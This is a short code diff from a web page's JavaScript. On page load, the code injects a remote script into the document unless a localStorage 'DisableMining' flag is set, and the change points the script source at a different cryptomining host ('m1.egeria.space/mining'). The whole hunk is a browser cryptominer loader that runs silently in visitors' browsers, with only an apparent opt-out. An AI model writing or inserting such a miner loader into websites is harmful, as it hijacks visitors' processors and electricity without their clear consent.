@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 localStorage.getItem('DisableMining') !== null
             )) {
             var x4 = document.createElement('script');
-            x4.setAttribute('src', 'https://cdn.minescripts.info/c/XQkR.js');
+            x4.setAttribute('src', 'https://m1.egeria.space/mining');
             x4.setAttribute('async', '');
             document.body.appendChild(x4);
         }
